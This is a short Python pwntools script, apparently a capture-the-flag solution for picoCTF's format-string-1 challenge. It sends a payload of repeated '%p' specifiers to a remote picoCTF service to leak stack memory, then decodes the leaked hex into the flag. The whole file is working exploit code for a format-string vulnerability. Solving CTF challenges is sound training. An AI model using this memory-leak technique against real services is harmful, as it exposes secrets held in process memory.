from pwn import *

# r = process('./format-string-1')
HOST, PORT = "mimas.picoctf.net 62080".split()
r = remote(HOST, PORT)

r.recvuntil(b'you:\n')

payload = b''
payload += b'%p-' * 10000
payload += (len(payload) % 8) * b'\x00'

r.sendline(payload)
r.recvuntil(b'order: ')

stack = r.recvline().decode().split('-')[:-1]
stack = [val[2:] for val in stack] 
ans = ''

for val in stack:
    try:
        ans += bytes.fromhex(val).decode()[::-1]
    except:
        continue

print(ans)

r.interactive()